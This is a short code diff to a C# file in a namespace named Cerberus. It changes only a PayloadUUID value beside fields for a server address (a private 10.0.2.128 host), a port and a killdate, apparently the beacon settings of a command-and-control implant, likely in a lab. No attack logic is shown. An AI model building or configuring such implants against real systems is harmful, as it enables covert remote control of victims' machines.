@@ -24,7 +24,7 @@ namespace Cerberus
 
         private static string serverAddress = "10.0.2.128";
         private static int serverPort = 80;
-        private static string PayloadUUID = "5745c5fb-0a9f-47fa-a8d9-eab32fb43c35";
+        private static string PayloadUUID = "36ca94cf-5d46-4ae9-8770-6e1e93a3ae79";
         private static string UUID = "";
         private string killdate = "";
 
